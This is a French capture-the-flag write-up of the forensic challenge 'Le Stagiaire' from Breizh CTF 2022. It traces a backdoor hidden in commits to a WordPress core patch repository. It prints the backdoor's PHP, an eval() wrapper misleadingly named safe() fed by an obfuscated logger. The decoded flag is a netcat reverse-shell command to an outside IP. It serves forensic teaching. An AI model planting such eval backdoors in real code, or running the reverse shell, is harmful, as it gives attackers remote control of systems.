<!DOCTYPE html>
<html lang="en-us">
<head>
  <script defer data-domain="itarow.xyz" src="https://plausible.itarow.xyz/js/plausible.js"></script>
  <link rel="preload" href="/lib/font-awesome/webfonts/fa-brands-400.woff2" as="font" type="font/woff2" crossorigin="anonymous">
  <link rel="preload" href="/lib/font-awesome/webfonts/fa-regular-400.woff2" as="font" type="font/woff2" crossorigin="anonymous">
  <link rel="preload" href="/lib/font-awesome/webfonts/fa-solid-900.woff2" as="font" type="font/woff2" crossorigin="anonymous">
  <link rel="preload" href="/lib/JetBrainsMono/web/woff2/JetBrainsMono-Regular.woff2" as="font" type="font/woff2" crossorigin="anonymous">
  <meta charset="utf-8">
  <meta http-equiv="X-UA-Compatible" content="IE=edge">
  <title> BZHCTF 2022 - Le Stagiaire | Itarow</title>
  <link rel = 'canonical' href = 'https://blog.itarow.xyz/posts/bzhctf_le_stagiaire/'>
  <meta name="description" content="CS student, writing some write up of cool CTF&#39;s challenges and infosec content.">
  <meta name="viewport" content="width=device-width, initial-scale=1">
  <meta name="robots" content="all,follow">
  <meta name="googlebot" content="index,follow,snippet,archive">
  <meta property="og:title" content="BZHCTF 2022 - Le Stagiaire" />
<meta property="og:description" content="Write up du chall &#34;Le Stagiaire&#34; du Breizh CTF 2022" />
<meta property="og:type" content="article" />
<meta property="og:url" content="https://blog.itarow.xyz/posts/bzhctf_le_stagiaire/" /><meta property="article:section" content="posts" />
<meta property="article:published_time" content="2022-04-03T12:07:35+02:00" />
<meta property="article:modified_time" content="2022-04-03T12:07:35+02:00" />

  <meta name="twitter:card" content="summary"/>
<meta name="twitter:title" content="BZHCTF 2022 - Le Stagiaire"/>
<meta name="twitter:description" content="Write up du chall &#34;Le Stagiaire&#34; du Breizh CTF 2022"/>

  
  
    
  
  
  <link rel="stylesheet" href="https://blog.itarow.xyz/css/styles.4dd8e96d6c0d53a6965a5a357c26fc29f6b838ad352dc5acda0754ff4b9409e5c58fa94716892c2a5d6a7e1b1bef8fbcaf2442656e81dfae00dc9464d707477d.css" integrity="sha512-TdjpbWwNU6aWWlo1fCb8Kfa4OK01LcWs2gdU/0uUCeXFj6lHFoksKl1qfhsb74&#43;8ryRCZW6B364A3JRk1wdHfQ=="> 

  
  
  
    <!--[if lt IE 9]>
      <script src="https://oss.maxcdn.com/html5shiv/3.7.2/html5shiv.min.js"></script>
      <script src="https://oss.maxcdn.com/respond/1.4.2/respond.min.js"></script>
    <![endif]-->
  

  
<link rel="icon" type="image/png" href="https://blog.itarow.xyz/images/favicon.ico" />

  
  
</head>

<body class="max-width mx-auto px3 ltr">
  <div class="content index py4">

  <div id="header-post">
  <a id="menu-icon" href="#"><i class="fas fa-bars fa-lg"></i></a>
  <a id="menu-icon-tablet" href="#"><i class="fas fa-bars fa-lg"></i></a>
  <a id="top-icon-tablet" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;" aria-label="Top of Page"><i class="fas fa-chevron-up fa-lg"></i></a>
  <span id="menu">
    <span id="nav">
      <ul>
         
        <li><a href="/">Home</a></li>
         
        <li><a href="/categories">Categories</a></li>
         
        <li><a href="/whoami">Whoami</a></li>
        
      </ul>
    </span>
    <br/>
    <span id="actions">
      <ul>
        
        <li>
          <a class="icon" href=" https://blog.itarow.xyz/whoami/" aria-label="Previous">
            <i class="fas fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i>
          </a>
        </li>
        
        
        <li>
          <a class="icon" href="https://blog.itarow.xyz/posts/bzhctf_des-deux-cotes-1/" aria-label="Next">
            <i class="fas fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i>
          </a>
        </li>
        
        <li>
          <a class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" aria-label="Top of Page">
            <i class="fas fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i>
          </a>
        </li>
        <li>
          <a class="icon" href="#" aria-label="Share">
            <i class="fas fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i>
          </a>
        </li>
      </ul>
      <span id="i-prev" class="info" style="display:none;">Previous post</span>
      <span id="i-next" class="info" style="display:none;">Next post</span>
      <span id="i-top" class="info" style="display:none;">Back to top</span>
      <span id="i-share" class="info" style="display:none;">Share post</span>
    </span>
    <br/>
    <div id="share" style="display: none">
      
      <ul>
  
  
    
  
  
  <li>
    <a class="icon" href="http://www.facebook.com/sharer.php?u=https%3a%2f%2fblog.itarow.xyz%2fposts%2fbzhctf_le_stagiaire%2f" aria-label="Facebook">
      <i class="fab fa-facebook " aria-hidden="true"></i>
    </a>
  </li>
  <li>
    <a class="icon" href="https://twitter.com/share?url=https%3a%2f%2fblog.itarow.xyz%2fposts%2fbzhctf_le_stagiaire%2f&text=BZHCTF%202022%20-%20Le%20Stagiaire" aria-label="Twitter">
      <i class="fab fa-twitter " aria-hidden="true"></i>
    </a>
  </li>
  <li>
    <a class="icon" href="http://www.linkedin.com/shareArticle?url=https%3a%2f%2fblog.itarow.xyz%2fposts%2fbzhctf_le_stagiaire%2f&title=BZHCTF%202022%20-%20Le%20Stagiaire" aria-label="Linkedin">
      <i class="fab fa-linkedin " aria-hidden="true"></i>
    </a>
  </li>
  <li>
    <a class="icon" href="https://pinterest.com/pin/create/bookmarklet/?url=https%3a%2f%2fblog.itarow.xyz%2fposts%2fbzhctf_le_stagiaire%2f&is_video=false&description=BZHCTF%202022%20-%20Le%20Stagiaire" aria-label="Pinterest">
      <i class="fab fa-pinterest " aria-hidden="true"></i>
    </a>
  </li>
  <li>
    <a class="icon" href="mailto:?subject=BZHCTF%202022%20-%20Le%20Stagiaire&body=Check out this article: https%3a%2f%2fblog.itarow.xyz%2fposts%2fbzhctf_le_stagiaire%2f" aria-label="Email">
      <i class="fas fa-envelope " aria-hidden="true"></i>
    </a>
  </li>
  <li>
    <a class="icon" href="https://getpocket.com/save?url=https%3a%2f%2fblog.itarow.xyz%2fposts%2fbzhctf_le_stagiaire%2f&title=BZHCTF%202022%20-%20Le%20Stagiaire" aria-label="Pocket">
      <i class="fab fa-get-pocket " aria-hidden="true"></i>
    </a>
  </li>
  <li>
    <a class="icon" href="http://reddit.com/submit?url=https%3a%2f%2fblog.itarow.xyz%2fposts%2fbzhctf_le_stagiaire%2f&title=BZHCTF%202022%20-%20Le%20Stagiaire" aria-label="reddit">
      <i class="fab fa-reddit " aria-hidden="true"></i>
    </a>
  </li>
  <li>
    <a class="icon" href="http://www.tumblr.com/share/link?url=https%3a%2f%2fblog.itarow.xyz%2fposts%2fbzhctf_le_stagiaire%2f&name=BZHCTF%202022%20-%20Le%20Stagiaire&description=Write%20up%20du%20chall%20%22Le%20Stagiaire%22%20du%20Breizh%20CTF%202022" aria-label="Tumblr">
      <i class="fab fa-tumblr " aria-hidden="true"></i>
    </a>
  </li>
  <li>
    <a class="icon" href="https://news.ycombinator.com/submitlink?u=https%3a%2f%2fblog.itarow.xyz%2fposts%2fbzhctf_le_stagiaire%2f&t=BZHCTF%202022%20-%20Le%20Stagiaire" aria-label="Hacker News">
      <i class="fab fa-hacker-news " aria-hidden="true"></i>
    </a>
  </li>
</ul>

    </div>
    
    <div id="toc">
      <nav id="TableOfContents">
  <ul>
    <li><a href="#énoncé">Énoncé</a></li>
    <li><a href="#solution">Solution</a></li>
    <li><a href="#conclusion">Conclusion</a></li>
  </ul>
</nav>
    </div>
    
  </span>
</div>


  <article class="post" itemscope itemtype="http://schema.org/BlogPosting">
    <header>
      <h1 class="posttitle" itemprop="name headline">
        BZHCTF 2022 - Le Stagiaire
      </h1>
      <div class="meta">
        
        <div class="postdate">
          
          <time datetime="2022-04-03 12:07:35 &#43;0200 CEST" itemprop="datePublished">2022-04-03</time>
          
        </div>
        
        
        <div class="article-read-time">
          <i class="far fa-clock"></i>
          
          4 minute read
        </div>
        
        
        <div class="article-category">
            <i class="fas fa-archive"></i>
            
            
            <a class="category-link" href="/categories/bzhctf-2022">BZHCTF-2022</a>
            
        </div>
        
        
        <div class="article-tag">
            <i class="fas fa-tag"></i>
            
            
            <a class="tag-link" href="/tags/forensic" rel="tag">Forensic</a>
            
             ,  
            <a class="tag-link" href="/tags/git" rel="tag">Git</a>
            
             ,  
            <a class="tag-link" href="/tags/ctf" rel="tag">CTF</a>
            
        </div>
        
      </div>
    </header>

  
    
    <div class="content" itemprop="articleBody">
      <p><img src="/img/bzhctf.png" alt="">
Voici le write-up du challenge &ldquo;Le Stagiaire&rdquo; en catégorie Forensic que j&rsquo;ai pu first blood lors du Breizh CTF. Merci à l&rsquo;organisation et l&rsquo;ESN&rsquo;HACK pour ce CTF fort sympathique ;)</p>
<h2 id="énoncé">Énoncé</h2>
<p>Un des stagiaires de votre entreprise a eu pour but pendant son stage de créer un document permettant de référencer les différents patchs à appliquer à une version de wordpress (core) pour améliorer la sécurité.</p>
<p>Tout son stage s&rsquo;est déroulé tranquillement, le jour avant de partir, il a créé un github permettant d&rsquo;appliquer toutes ses recommandations.</p>
<p>En partant de l&rsquo;entreprise, le RSSI a déployé une image de ce répo github et a pu voir que cela marchait parfaitement, il a donc déployé le site principal avec.</p>
<p>Une semaine après, on s&rsquo;est rendu compte que l&rsquo;accès VPN du stagiaire n&rsquo;avait pas été révoqué, il l&rsquo;a donc été. En regardant l&rsquo;historique de connexion, on a pu remarqué qu&rsquo;il a continué à l&rsquo;utiliser malgré le fait qu&rsquo;il n&rsquo;était plus dans la boîte.</p>
<p>Nous nous sommes aussi rendu compte que toutes les données de nos clients avaient été vendues sur internet, et que le stagiaire avait donc implémenté une backdoor sur ses patchs du core de wordpress.</p>
<p>Trouvez la backdoor dans les différents commits githubs permettant d&rsquo;inculper en justice l&rsquo;ancien stagiaire !</p>
<p>Auteur: Worty</p>
<p>Format: BZHCTF{preuve backdoor}</p>
<h2 id="solution">Solution</h2>
<p>Pour ce challenge, on se retrouve face à un repo git sans fichier, juste avec le dossier .git. Au vu de l&rsquo;énoncé, notre but va être de trouver du code étrange dans les commits afin de trouver la backdoor.</p>
<p>Première commande à lancer, <code>git log</code>, elle nous permet de lister l&rsquo;ensemble des commits et leurs id :</p>
<p><img src="/img/bzhctf_le-stagiaire/1.png" alt=""></p>
<p>On voit donc quasiment 10 commits, on peut regarder quel code a été modifié avec la commande git show id_du_commit.</p>
<p>Avec <code>git show ed9c5a22bc1c7330072ad5a0b021aa8ff4409804</code> :</p>
<p><img src="/img/bzhctf_le-stagiaire/2.png" alt=""></p>
<p>Ma méthode a donc été de me balader rapidement dans les commits afin de trouver une/des anomalies dans le code qui s&rsquo;associeraient à une backdoor.</p>
<p>Un premier commit qui m&rsquo;a interpellé, le 1d8c1524154735abf4d255ed59da82726662e23e, avec ce code-là qui a été modifié :</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span><span style="color:#66d9ef">function</span> <span style="color:#a6e22e">wp_generate_password</span>( $length <span style="color:#f92672">=</span> <span style="color:#ae81ff">12</span>, $special_chars <span style="color:#f92672">=</span> <span style="color:#66d9ef">true</span>,$extra_special_chars <span style="color:#f92672">=</span> <span style="color:#66d9ef">false</span> ) {
</span></span><span style="display:flex;"><span><span style="color:#f92672">-</span> $chars <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789&#39;</span>;
</span></span><span style="display:flex;"><span><span style="color:#f92672">+</span>               
</span></span><span style="display:flex;"><span><span style="color:#f92672">+</span> $chars <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;aZbncVdyeefXglhficjmktlymcnCogpiqYrXsAtguMvTwkxyyLzjAEB2CODCE4F2GOHCI4J1KMLyMAN2ONPTQERySMTyUAVtWcXiYAZv0b132Z3h4L52697u8Z9naUbicKdTes&#39;</span>; <span style="color:#75715e">//to be really random, because i dont trust alphabet generation
</span></span></span></code></pre></div><p>Le commentaire parait étrange, on tente de décoder la string de la variable $chars mais cela ne donne rien.</p>
<p>Regardons le commit suivant :</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span><span style="color:#f92672">+</span> <span style="color:#75715e">//log all new passwords for admins
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#f92672">+</span> $status <span style="color:#f92672">=</span> <span style="color:#a6e22e">logger_for_dev</span>(<span style="color:#e6db74">&#34;New password generated: &#34;</span><span style="color:#f92672">.</span>$password<span style="color:#f92672">.</span><span style="color:#e6db74">&#34; with list of caracters&#34;</span><span style="color:#f92672">.</span>$chars,<span style="color:#e6db74">&#34;password&#34;</span>);
</span></span><span style="display:flex;"><span><span style="color:#f92672">+</span>               
</span></span><span style="display:flex;"><span><span style="color:#f92672">+</span> $status <span style="color:#f92672">=</span> <span style="color:#a6e22e">safe</span>($status); <span style="color:#75715e">//will safe status content for return
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#f92672">...</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">+/**</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">+</span> <span style="color:#f92672">*</span> <span style="color:#66d9ef">This</span> <span style="color:#66d9ef">function</span> <span style="color:#a6e22e">is</span> <span style="color:#a6e22e">trusted</span> <span style="color:#a6e22e">by</span> <span style="color:#a6e22e">test</span> <span style="color:#a6e22e">before</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">+</span> <span style="color:#f92672">*</span> 
</span></span><span style="display:flex;"><span><span style="color:#f92672">+</span> <span style="color:#f92672">*</span> <span style="color:#66d9ef">USE</span> <span style="color:#a6e22e">IT</span> <span style="color:#a6e22e">very</span> <span style="color:#a6e22e">carefully</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">+</span> <span style="color:#f92672">*/</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">+</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">+</span><span style="color:#66d9ef">function</span> <span style="color:#a6e22e">safe</span>($str)
</span></span><span style="display:flex;"><span><span style="color:#f92672">+</span>{
</span></span><span style="display:flex;"><span><span style="color:#f92672">+</span>       <span style="color:#66d9ef">eval</span>($str);
</span></span><span style="display:flex;"><span><span style="color:#f92672">+</span>       <span style="color:#66d9ef">return</span> <span style="color:#e6db74">&#34;safe&#34;</span>;
</span></span><span style="display:flex;"><span><span style="color:#f92672">+</span>}
</span></span></code></pre></div><p>On voit à la suite de la méthode wp_generate_password, qu&rsquo;un call à la fonction safe avec pour paramètre le retour de la fonction logger_for_dev qui a été créer :</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span><span style="color:#f92672">+</span> <span style="color:#75715e">//logger for dev on text and password
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#f92672">+</span> <span style="color:#66d9ef">function</span> <span style="color:#a6e22e">logger_for_dev</span>($msg,$importance)
</span></span><span style="display:flex;"><span><span style="color:#f92672">+</span> {
</span></span><span style="display:flex;"><span><span style="color:#f92672">+</span>       <span style="color:#66d9ef">switch</span>($importance){
</span></span><span style="display:flex;"><span><span style="color:#f92672">+</span>        <span style="color:#66d9ef">case</span> <span style="color:#e6db74">&#34;danger&#34;</span><span style="color:#f92672">:</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">+</span>            <span style="color:#a6e22e">file_put_contents</span>(<span style="color:#e6db74">&#34;/tmp/log.danger&#34;</span>,$msg);
</span></span><span style="display:flex;"><span><span style="color:#f92672">+</span>                       $res <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;ok&#34;</span>;
</span></span><span style="display:flex;"><span><span style="color:#f92672">+</span>                       <span style="color:#66d9ef">return</span> $res;
</span></span><span style="display:flex;"><span><span style="color:#f92672">+</span>            <span style="color:#66d9ef">break</span>;
</span></span><span style="display:flex;"><span><span style="color:#f92672">+</span>        <span style="color:#66d9ef">case</span> <span style="color:#e6db74">&#34;medium&#34;</span><span style="color:#f92672">:</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">+</span>            <span style="color:#a6e22e">file_put_contents</span>(<span style="color:#e6db74">&#34;/tmp/log.medium&#34;</span>,$msg);
</span></span><span style="display:flex;"><span><span style="color:#f92672">+</span>                       $res <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;ok&#34;</span>;
</span></span><span style="display:flex;"><span><span style="color:#f92672">+</span>                       <span style="color:#66d9ef">return</span> $res;
</span></span><span style="display:flex;"><span><span style="color:#f92672">+</span>            <span style="color:#66d9ef">break</span>;
</span></span><span style="display:flex;"><span><span style="color:#f92672">+</span>        <span style="color:#66d9ef">case</span> <span style="color:#e6db74">&#34;password&#34;</span><span style="color:#f92672">:</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">+</span>                       <span style="color:#75715e">//we will decrypt the password
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#f92672">+</span>                       $res <span style="color:#f92672">=</span> <span style="color:#a6e22e">explode</span>(<span style="color:#e6db74">&#34; &#34;</span>,$msg);
</span></span><span style="display:flex;"><span><span style="color:#f92672">+</span>                       $password_generated <span style="color:#f92672">=</span> $res[(<span style="color:#a6e22e">sizeof</span>($res)<span style="color:#f92672">%</span><span style="color:#ae81ff">10</span>)<span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>];
</span></span><span style="display:flex;"><span><span style="color:#f92672">+</span>                       $res <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;&#34;</span>;
</span></span><span style="display:flex;"><span><span style="color:#f92672">+</span>                       <span style="color:#66d9ef">for</span>($i<span style="color:#f92672">=</span><span style="color:#ae81ff">0</span>;$i<span style="color:#f92672">&lt;</span><span style="color:#a6e22e">strlen</span>($password);$i<span style="color:#f92672">++</span>){ <span style="color:#66d9ef">if</span>($i<span style="color:#f92672">%</span><span style="color:#ae81ff">2</span><span style="color:#f92672">==</span><span style="color:#ae81ff">1</span>) $res <span style="color:#f92672">.=</span> $password[$i]; }
</span></span><span style="display:flex;"><span><span style="color:#f92672">+</span>            <span style="color:#a6e22e">file_put_contents</span>(<span style="color:#e6db74">&#34;/tmp/log.password&#34;</span>,<span style="color:#e6db74">&#34;New password generated is&#34;</span><span style="color:#f92672">.</span>$res<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;&#34;</span>);
</span></span><span style="display:flex;"><span><span style="color:#f92672">+</span>            <span style="color:#66d9ef">return</span> $res;
</span></span><span style="display:flex;"><span><span style="color:#f92672">+</span>                       <span style="color:#66d9ef">break</span>;
</span></span><span style="display:flex;"><span><span style="color:#f92672">+</span>    }
</span></span><span style="display:flex;"><span><span style="color:#f92672">+</span> }
</span></span></code></pre></div><p>On voit le &ldquo;we will decrypt the password&rdquo; avec une boucle for qui va prendre un caractère sur 2 dans la variable $password, on est sur la bonne voie. On refait instantanément le bout de code php avec pour paramètres la long string $chars en entier. Note : J&rsquo;ai supposé que $password prendrait cette valeur lors de la backdoor, il y avait aussi un substring avec wp_rand sur $chars juste avant, mais j&rsquo;ai décidé de ne pas m&rsquo;en préocuper, en supposant qu&rsquo;il ne rentrait pas dans la condition.</p>
<p>Voici donc le code php :</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span><span style="color:#f92672">&lt;?</span><span style="color:#a6e22e">php</span> 
</span></span><span style="display:flex;"><span>$chars <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;aZbncVdyeefXglhficjmktlymcnCogpiqYrXsAtguMvTwkxyyLzjAEB2CODCE4F2GOHCI4J1KMLyMAN2ONPTQERySMTyUAVtWcXiYAZv0b132Z3h4L52697u8Z9naUbicKdTes&#39;</span>;
</span></span><span style="display:flex;"><span>$password <span style="color:#f92672">=</span> $chars;
</span></span><span style="display:flex;"><span>$res <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;&#34;</span>;
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">for</span>($i<span style="color:#f92672">=</span><span style="color:#ae81ff">0</span>;$i<span style="color:#f92672">&lt;</span><span style="color:#a6e22e">strlen</span>($password);$i<span style="color:#f92672">++</span>){ <span style="color:#66d9ef">if</span>($i<span style="color:#f92672">%</span><span style="color:#ae81ff">2</span><span style="color:#f92672">==</span><span style="color:#ae81ff">1</span>) $res <span style="color:#f92672">.=</span> $password[$i]; }
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">echo</span> $res;
</span></span></code></pre></div><p>On obtient ce résultat en decodant la string obtenu en base64 :
<img src="/img/bzhctf_le-stagiaire/4.png" alt=""></p>
<p>On voit une commande, mais le flag ne passe pas. On recheck la string et on voit que la commande n&rsquo;est pas vraiment valide et qu&rsquo;il y a un problème au niveau des caractères seulement alphabétiques. On peut donc penser à un César tout bête. On passe le tout dans dcode en brutforcant la clé et hop :</p>
<p><img src="/img/bzhctf_le-stagiaire/5.png" alt=""></p>
<p>On obtient donc notre Flag qui était la commande backdoorée passée dans le eval: <code>BZHCTF{shell_exec(&quot;nc 192.168.68.53 65123 -e /bin/bash&quot;);}</code></p>
<h2 id="conclusion">Conclusion</h2>
<p>On a vu que la méthode était quelque peu approximative et que l&rsquo;on ne savait pas que $password serait égale à $chars et il n&rsquo;y avait pas de code pour décoder le base64 et le césar. En réanalysant le code après le CTF, je ne comprenais toujours pas, et au final en demandant à Worty (l&rsquo;auteur), c&rsquo;était deux erreurs, donc au final pas de problèmes. Comme on l&rsquo;a vu, cela ne posait pas de problème, car le code était prévisible.</p>
<p>Merci à Worty pour le chall, ça changeait de ce qu&rsquo;on voit d&rsquo;habitude en forensic :) \o/</p>

    </div>
  </article>

  
  





  <div id="footer-post-container">
  <div id="footer-post">

    <div id="nav-footer" style="display: none">
      <ul>
         
          <li><a href="/">Home</a></li>
         
          <li><a href="/categories">Categories</a></li>
         
          <li><a href="/whoami">Whoami</a></li>
        
      </ul>
    </div>

    
    <div id="toc-footer" style="display: none">
      <nav id="TableOfContents">
  <ul>
    <li><a href="#énoncé">Énoncé</a></li>
    <li><a href="#solution">Solution</a></li>
    <li><a href="#conclusion">Conclusion</a></li>
  </ul>
</nav>
    </div>
    

    <div id="share-footer" style="display: none">
      
      <ul>
  
  
    
  
  
  <li>
    <a class="icon" href="http://www.facebook.com/sharer.php?u=https%3a%2f%2fblog.itarow.xyz%2fposts%2fbzhctf_le_stagiaire%2f" aria-label="Facebook">
      <i class="fab fa-facebook fa-lg" aria-hidden="true"></i>
    </a>
  </li>
  <li>
    <a class="icon" href="https://twitter.com/share?url=https%3a%2f%2fblog.itarow.xyz%2fposts%2fbzhctf_le_stagiaire%2f&text=BZHCTF%202022%20-%20Le%20Stagiaire" aria-label="Twitter">
      <i class="fab fa-twitter fa-lg" aria-hidden="true"></i>
    </a>
  </li>
  <li>
    <a class="icon" href="http://www.linkedin.com/shareArticle?url=https%3a%2f%2fblog.itarow.xyz%2fposts%2fbzhctf_le_stagiaire%2f&title=BZHCTF%202022%20-%20Le%20Stagiaire" aria-label="Linkedin">
      <i class="fab fa-linkedin fa-lg" aria-hidden="true"></i>
    </a>
  </li>
  <li>
    <a class="icon" href="https://pinterest.com/pin/create/bookmarklet/?url=https%3a%2f%2fblog.itarow.xyz%2fposts%2fbzhctf_le_stagiaire%2f&is_video=false&description=BZHCTF%202022%20-%20Le%20Stagiaire" aria-label="Pinterest">
      <i class="fab fa-pinterest fa-lg" aria-hidden="true"></i>
    </a>
  </li>
  <li>
    <a class="icon" href="mailto:?subject=BZHCTF%202022%20-%20Le%20Stagiaire&body=Check out this article: https%3a%2f%2fblog.itarow.xyz%2fposts%2fbzhctf_le_stagiaire%2f" aria-label="Email">
      <i class="fas fa-envelope fa-lg" aria-hidden="true"></i>
    </a>
  </li>
  <li>
    <a class="icon" href="https://getpocket.com/save?url=https%3a%2f%2fblog.itarow.xyz%2fposts%2fbzhctf_le_stagiaire%2f&title=BZHCTF%202022%20-%20Le%20Stagiaire" aria-label="Pocket">
      <i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i>
    </a>
  </li>
  <li>
    <a class="icon" href="http://reddit.com/submit?url=https%3a%2f%2fblog.itarow.xyz%2fposts%2fbzhctf_le_stagiaire%2f&title=BZHCTF%202022%20-%20Le%20Stagiaire" aria-label="reddit">
      <i class="fab fa-reddit fa-lg" aria-hidden="true"></i>
    </a>
  </li>
  <li>
    <a class="icon" href="http://www.tumblr.com/share/link?url=https%3a%2f%2fblog.itarow.xyz%2fposts%2fbzhctf_le_stagiaire%2f&name=BZHCTF%202022%20-%20Le%20Stagiaire&description=Write%20up%20du%20chall%20%22Le%20Stagiaire%22%20du%20Breizh%20CTF%202022" aria-label="Tumblr">
      <i class="fab fa-tumblr fa-lg" aria-hidden="true"></i>
    </a>
  </li>
  <li>
    <a class="icon" href="https://news.ycombinator.com/submitlink?u=https%3a%2f%2fblog.itarow.xyz%2fposts%2fbzhctf_le_stagiaire%2f&t=BZHCTF%202022%20-%20Le%20Stagiaire" aria-label="Hacker News">
      <i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i>
    </a>
  </li>
</ul>

    </div>

    <div id="actions-footer">
      
        <a id="menu-toggle" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;" aria-label="Menu">
          <i class="fas fa-bars fa-lg" aria-hidden="true"></i> Menu</a>
        
        <a id="toc-toggle" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;" aria-label="TOC">
          <i class="fas fa-list fa-lg" aria-hidden="true"></i> TOC</a>
        
        <a id="share-toggle" class="icon" href="#" onclick="$('#share-footer').toggle();return false;" aria-label="Share">
          <i class="fas fa-share-alt fa-lg" aria-hidden="true"></i> share</a>
        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" aria-label="Top of Page">
          <i class="fas fa-chevron-up fa-lg" aria-hidden="true"></i> Top</a>
    </div>

  </div>
</div>


  <footer id="footer">
  <div class="footer-left">
    Copyright  &copy; 2024  Itarow 
  </div>
  <div class="footer-right">
    <nav>
      <ul>
         
        <li><a href="/">Home</a></li>
         
        <li><a href="/categories">Categories</a></li>
         
        <li><a href="/whoami">Whoami</a></li>
        
      </ul>
    </nav>
  </div>
</footer>


  </div>
</body>

<link rel="stylesheet" href=/lib/font-awesome/css/all.min.css>
<script src=/lib/jquery/jquery.min.js></script>
<script src=/js/main.js></script>



</html>
